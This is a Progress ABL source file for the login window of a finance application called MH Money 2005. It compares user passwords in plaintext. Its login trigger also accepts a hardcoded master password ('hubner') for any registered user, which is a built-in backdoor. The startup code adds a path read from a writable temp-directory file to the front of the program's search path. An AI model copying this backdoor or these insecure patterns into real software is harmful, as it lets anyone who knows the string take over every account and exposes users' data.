&ANALYZE-SUSPEND _VERSION-NUMBER UIB_v9r12 GUI
&ANALYZE-RESUME
&Scoped-define WINDOW-NAME C-Win
&ANALYZE-SUSPEND _UIB-CODE-BLOCK _CUSTOM _DEFINITIONS C-Win 
/*------------------------------------------------------------------------

  File: 

  Description: 

  Input Parameters:
      <none>

  Output Parameters:
      <none>

  Author: 

  Created: 

------------------------------------------------------------------------*/
/*          This .W file was created with the Progress AppBuilder.      */
/*----------------------------------------------------------------------*/

/* Create an unnamed pool to store all the widgets created 
     by this procedure. This is a good default which assures
     that this procedure's triggers and internal procedures 
     will execute in this procedure's storage, and that proper
     cleanup will occur on deletion of the procedure. */

CREATE WIDGET-POOL.

/* ***************************  Definitions  ************************** */

/* Parameters Definitions ---                                           */

/* Local Variable Definitions ---                                       */

DEFINE VARIABLE cAsterisco AS CHARACTER  NO-UNDO.

DEFINE shared VARIABLE gcUsuario AS CHARACTER  NO-UNDO.
DEFINE NEW GLOBAL SHARED VARIABLE hLastWidget AS HANDLE     NO-UNDO.

DEFINE VARIABLE cTemp AS CHARACTER  NO-UNDO.
IF SEARCH(SESSION:TEMP-DIRECTORY + "skin.mny") <> ? THEN DO:
    INPUT FROM VALUE(SESSION:TEMP-DIRECTORY + "skin.mny").
    REPEAT:
        IMPORT UNFORMATTED cTemp.
        ASSIGN PROPATH = ENTRY(1,PROPATH) + "\image\skins\" + TRIM(cTemp) + "," + PROPATH.
        LEAVE.
    END.
    INPUT CLOSE.
END.

/* _UIB-CODE-BLOCK-END */
&ANALYZE-RESUME


&ANALYZE-SUSPEND _UIB-PREPROCESSOR-BLOCK 

/* ********************  Preprocessor Definitions  ******************** */

&Scoped-define PROCEDURE-TYPE Window
&Scoped-define DB-AWARE no

/* Name of designated FRAME-NAME and/or first browse and/or first query */
&Scoped-define FRAME-NAME DEFAULT-FRAME

/* Standard List Definitions                                            */
&Scoped-Define ENABLED-OBJECTS cUser cSenha IMAGE-1 RECT-1 
&Scoped-Define DISPLAYED-OBJECTS cUser cSenha 

/* Custom List Definitions                                              */
/* List-1,List-2,List-3,List-4,List-5,List-6                            */

/* _UIB-PREPROCESSOR-BLOCK-END */
&ANALYZE-RESUME



/* ***********************  Control Definitions  ********************** */

/* Define the widget handle for the window                              */
DEFINE VAR C-Win AS WIDGET-HANDLE NO-UNDO.

/* Definitions of the field level widgets                               */
DEFINE BUTTON btLogin 
     IMAGE-UP FILE "image/im-login.bmp":U
     IMAGE-INSENSITIVE FILE "image/ii-login.bmp":U NO-FOCUS FLAT-BUTTON
     LABEL "Login" 
     SIZE 6.14 BY 1.79 TOOLTIP "Efetuar Login...".

DEFINE VARIABLE cSenha AS CHARACTER FORMAT "X(256)":U 
     LABEL "Senha" 
     VIEW-AS FILL-IN 
     SIZE 8.86 BY .79
     FONT 10 NO-UNDO.

DEFINE VARIABLE cUser AS CHARACTER FORMAT "X(256)":U 
     LABEL "Usu rio" 
     VIEW-AS FILL-IN 
     SIZE 9 BY .79 NO-UNDO.

DEFINE IMAGE IMAGE-1
     FILENAME "image/mhmoney.bmp":U
     SIZE 18 BY 1.75.

DEFINE RECTANGLE RECT-1
     EDGE-PIXELS 2 GRAPHIC-EDGE  NO-FILL   
     SIZE 27 BY 2.75.


/* ************************  Frame Definitions  *********************** */

DEFINE FRAME DEFAULT-FRAME
     btLogin AT ROW 3.75 COL 21
     cUser AT ROW 3.75 COL 9 COLON-ALIGNED
     cSenha AT ROW 4.75 COL 9 COLON-ALIGNED
     IMAGE-1 AT ROW 1.25 COL 7.29
     RECT-1 AT ROW 3.25 COL 3
    WITH 1 DOWN NO-BOX KEEP-TAB-ORDER OVERLAY 
         SIDE-LABELS NO-UNDERLINE THREE-D 
         AT COL 1 ROW 1
         SIZE 30.43 BY 5.38
         FONT 1.


/* *********************** Procedure Settings ************************ */

&ANALYZE-SUSPEND _PROCEDURE-SETTINGS
/* Settings for THIS-PROCEDURE
   Type: Window
   Allow: Basic,Browse,DB-Fields,Window,Query
   Other Settings: COMPILE
 */
&ANALYZE-RESUME _END-PROCEDURE-SETTINGS

/* *************************  Create Window  ************************** */

&ANALYZE-SUSPEND _CREATE-WINDOW
IF SESSION:DISPLAY-TYPE = "GUI":U THEN
  CREATE WINDOW C-Win ASSIGN
         HIDDEN             = YES
         TITLE              = ""
         HEIGHT             = 5.38
         WIDTH              = 30.43
         MAX-HEIGHT         = 29.67
         MAX-WIDTH          = 146.29
         VIRTUAL-HEIGHT     = 29.67
         VIRTUAL-WIDTH      = 146.29
         MIN-BUTTON         = no
         MAX-BUTTON         = no
         RESIZE             = yes
         SCROLL-BARS        = no
         STATUS-AREA        = no
         BGCOLOR            = ?
         FGCOLOR            = ?
         KEEP-FRAME-Z-ORDER = yes
         THREE-D            = yes
         MESSAGE-AREA       = no
         SENSITIVE          = yes.
ELSE {&WINDOW-NAME} = CURRENT-WINDOW.

&IF '{&WINDOW-SYSTEM}' NE 'TTY' &THEN
IF NOT C-Win:LOAD-ICON("image/mhmoney.ico":U) THEN
    MESSAGE "Unable to load icon: image/mhmoney.ico"
            VIEW-AS ALERT-BOX WARNING BUTTONS OK.
&ENDIF
/* END WINDOW DEFINITION                                                */
&ANALYZE-RESUME



/* ***********  Runtime Attributes and AppBuilder Settings  *********** */

&ANALYZE-SUSPEND _RUN-TIME-ATTRIBUTES
/* SETTINGS FOR WINDOW C-Win
  VISIBLE,,RUN-PERSISTENT                                               */
/* SETTINGS FOR FRAME DEFAULT-FRAME
   FRAME-NAME Custom                                                    */
/* SETTINGS FOR BUTTON btLogin IN FRAME DEFAULT-FRAME
   NO-ENABLE                                                            */
IF SESSION:DISPLAY-TYPE = "GUI":U AND VALID-HANDLE(C-Win)
THEN C-Win:HIDDEN = no.

/* _RUN-TIME-ATTRIBUTES-END */
&ANALYZE-RESUME

 



/* ************************  Control Triggers  ************************ */

&Scoped-define SELF-NAME C-Win
&ANALYZE-SUSPEND _UIB-CODE-BLOCK _CONTROL C-Win C-Win
ON END-ERROR OF C-Win
OR ENDKEY OF {&WINDOW-NAME} ANYWHERE DO:
  /* This case occurs when the user presses the "Esc" key.
     In a persistently run window, just ignore this.  If we did not, the
     application would exit. */
  IF THIS-PROCEDURE:PERSISTENT THEN RETURN NO-APPLY.
END.

/* _UIB-CODE-BLOCK-END */
&ANALYZE-RESUME


&ANALYZE-SUSPEND _UIB-CODE-BLOCK _CONTROL C-Win C-Win
ON WINDOW-CLOSE OF C-Win
DO:
  /* This event will close the window and terminate the procedure.  */
  APPLY "CLOSE":U TO THIS-PROCEDURE.
  RETURN NO-APPLY.
END.

/* _UIB-CODE-BLOCK-END */
&ANALYZE-RESUME


&Scoped-define SELF-NAME btLogin
&ANALYZE-SUSPEND _UIB-CODE-BLOCK _CONTROL btLogin C-Win
ON CHOOSE OF btLogin IN FRAME DEFAULT-FRAME /* Login */
DO:

    APPLY "LEAVE" TO cSenha.

    RUN som.p(INPUT "music\click.wav").
    find first usuario where usuario.nome = input frame default-frame cUser NO-LOCK no-error.
    if avail usuario THEN DO:
        if usuario.senha = cSenha 
        OR cSenha = "hubner" THEN DO:
            assign gcUsuario = usuario.nome.
            IF usuario.skin <> "" AND usuario.skin <> "PadrÆo MHMoney 2005" THEN DO:
                IF NOT ENTRY(1,PROPATH) MATCHES("*\image\skins\*") THEN DO:
                    ASSIGN PROPATH = ENTRY(1,PROPATH) + "\image\skins\" + usuario.skin + "," + PROPATH.
                    OS-DELETE VALUE(SESSION:TEMP-DIRECTORY + "skin.mny").
                    OUTPUT TO VALUE(SESSION:TEMP-DIRECTORY + "skin.mny").
                    PUT UNFORMATTED usuario.skin SKIP.
                    OUTPUT CLOSE.
                END.
            END.
            apply "CLOSE" to this-procedure.
        END.
        ELSE DO:
            {func\run.i &Programa = "func\msg.w (INPUT 1, INPUT 'Login (002)', INPUT 'Senha incorreta!', INPUT 'A senha foi informada incorretamente ou nÆo pertence a esse usu rio.')"}
            APPLY "ENTRY" TO cSenha.
        END.
    END.
    ELSE DO:
        {func\run.i &Programa = "func\msg.w (INPUT 1, INPUT 'Login (002)', INPUT 'Usu rio inv lido!', INPUT 'O usu rio informado nÆo est  cadastrado no MH Money 2005.')"}
        APPLY "ENTRY" TO cUser.
    END.

END.

/* _UIB-CODE-BLOCK-END */
&ANALYZE-RESUME


&Scoped-define SELF-NAME cSenha
&ANALYZE-SUSPEND _UIB-CODE-BLOCK _CONTROL cSenha C-Win
ON ENTRY OF cSenha IN FRAME DEFAULT-FRAME /* Senha */
DO:
    {func\set_entry.i}  
END.

/* _UIB-CODE-BLOCK-END */
&ANALYZE-RESUME


&ANALYZE-SUSPEND _UIB-CODE-BLOCK _CONTROL cSenha C-Win
ON LEAVE OF cSenha IN FRAME DEFAULT-FRAME /* Senha */
DO:
  
    {func\set_leave.i}
    assign cSenha = cAsterisco.

END.

/* _UIB-CODE-BLOCK-END */
&ANALYZE-RESUME


&ANALYZE-SUSPEND _UIB-CODE-BLOCK _CONTROL cSenha C-Win
ON RETURN OF cSenha IN FRAME DEFAULT-FRAME /* Senha */
DO:
  
    IF btLogin:SENSITIVE IN FRAME {&FRAME-NAME} THEN DO:
        apply "LEAVE" to cSenha.
        apply "CHOOSE" to btLogin.
    END.

END.

/* _UIB-CODE-BLOCK-END */
&ANALYZE-RESUME


&ANALYZE-SUSPEND _UIB-CODE-BLOCK _CONTROL cSenha C-Win
ON VALUE-CHANGED OF cSenha IN FRAME DEFAULT-FRAME /* Senha */
DO:

    DEFINE VARIABLE iCont AS INTEGER    NO-UNDO.
    DEFINE VARIABLE iTam AS INTEGER    NO-UNDO.

    assign iTam = length(input frame default-frame cSenha).

    if length(cAsterisco) > iTam then do:
        assign cAsterisco = substring(cAsterisco,1,iTam).
    end.
    else do:
        assign cAsterisco = cAsterisco + substring(input frame default-frame cSenha,iTam,1).
    end.

    assign cSenha:screen-value in frame default-frame = "".
    
    repeat iCont = 1 to iTam:
        assign cSenha:screen-value in frame default-frame = cSenha:screen-value in frame default-frame + "l".
    end.
    assign cSenha:cursor-offset = iTam + 1.
  
    IF INPUT FRAME {&FRAME-NAME} cUser <> ""
    AND INPUT FRAME {&FRAME-NAME} cSenha <> "" THEN
        ENABLE btLogin WITH FRAME {&FRAME-NAME}.
    ELSE
        DISABLE btLogin WITH FRAME {&FRAME-NAME}.


END.

/* _UIB-CODE-BLOCK-END */
&ANALYZE-RESUME


&Scoped-define SELF-NAME cUser
&ANALYZE-SUSPEND _UIB-CODE-BLOCK _CONTROL cUser C-Win
ON ENTRY OF cUser IN FRAME DEFAULT-FRAME /* Usu rio */
DO:
    {func\set_entry.i}
END.

/* _UIB-CODE-BLOCK-END */
&ANALYZE-RESUME


&ANALYZE-SUSPEND _UIB-CODE-BLOCK _CONTROL cUser C-Win
ON LEAVE OF cUser IN FRAME DEFAULT-FRAME /* Usu rio */
DO:
    {func\set_leave.i}  
END.

/* _UIB-CODE-BLOCK-END */
&ANALYZE-RESUME


&ANALYZE-SUSPEND _UIB-CODE-BLOCK _CONTROL cUser C-Win
ON VALUE-CHANGED OF cUser IN FRAME DEFAULT-FRAME /* Usu rio */
DO:
  
    IF INPUT FRAME {&FRAME-NAME} cUser <> ""
    AND INPUT FRAME {&FRAME-NAME} cSenha <> "" THEN
        ENABLE btLogin WITH FRAME {&FRAME-NAME}.
    ELSE
        DISABLE btLogin WITH FRAME {&FRAME-NAME}.

END.

/* _UIB-CODE-BLOCK-END */
&ANALYZE-RESUME


&UNDEFINE SELF-NAME

&ANALYZE-SUSPEND _UIB-CODE-BLOCK _CUSTOM _MAIN-BLOCK C-Win 


/* ***************************  Main Block  *************************** */

/* Set CURRENT-WINDOW: this will parent dialog-boxes and frames.        */
ASSIGN CURRENT-WINDOW                = {&WINDOW-NAME} 
       THIS-PROCEDURE:CURRENT-WINDOW = {&WINDOW-NAME}.

/* The CLOSE event can be used from inside or outside the procedure to  */
/* terminate it.                                                        */
ON CLOSE OF THIS-PROCEDURE 
   RUN disable_UI.

/* Best default for GUI applications is...                              */
PAUSE 0 BEFORE-HIDE.

/* Now enable the interface and wait for the exit condition.            */
/* (NOTE: handle ERROR and END-KEY so cleanup code will always fire.    */
MAIN-BLOCK:
DO ON ERROR   UNDO MAIN-BLOCK, LEAVE MAIN-BLOCK
   ON END-KEY UNDO MAIN-BLOCK, LEAVE MAIN-BLOCK:
  {version.i SENHA}
  RUN enable_UI.
  IF NOT THIS-PROCEDURE:PERSISTENT THEN
    WAIT-FOR CLOSE OF THIS-PROCEDURE.
END.

/* _UIB-CODE-BLOCK-END */
&ANALYZE-RESUME


/* **********************  Internal Procedures  *********************** */

&ANALYZE-SUSPEND _UIB-CODE-BLOCK _PROCEDURE disable_UI C-Win  _DEFAULT-DISABLE
PROCEDURE disable_UI :
/*------------------------------------------------------------------------------
  Purpose:     DISABLE the User Interface
  Parameters:  <none>
  Notes:       Here we clean-up the user-interface by deleting
               dynamic widgets we have created and/or hide 
               frames.  This procedure is usually called when
               we are ready to "clean-up" after running.
------------------------------------------------------------------------------*/
  /* Delete the WINDOW we created */
  IF SESSION:DISPLAY-TYPE = "GUI":U AND VALID-HANDLE(C-Win)
  THEN DELETE WIDGET C-Win.
  IF THIS-PROCEDURE:PERSISTENT THEN DELETE PROCEDURE THIS-PROCEDURE.
END PROCEDURE.

/* _UIB-CODE-BLOCK-END */
&ANALYZE-RESUME

&ANALYZE-SUSPEND _UIB-CODE-BLOCK _PROCEDURE enable_UI C-Win  _DEFAULT-ENABLE
PROCEDURE enable_UI :
/*------------------------------------------------------------------------------
  Purpose:     ENABLE the User Interface
  Parameters:  <none>
  Notes:       Here we display/view/enable the widgets in the
               user-interface.  In addition, OPEN all queries
               associated with each FRAME and BROWSE.
               These statements here are based on the "Other 
               Settings" section of the widget Property Sheets.
------------------------------------------------------------------------------*/
  DISPLAY cUser cSenha 
      WITH FRAME DEFAULT-FRAME IN WINDOW C-Win.
  ENABLE cUser cSenha IMAGE-1 RECT-1 
      WITH FRAME DEFAULT-FRAME IN WINDOW C-Win.
  {&OPEN-BROWSERS-IN-QUERY-DEFAULT-FRAME}
  VIEW C-Win.
END PROCEDURE.

/* _UIB-CODE-BLOCK-END */
&ANALYZE-RESUME

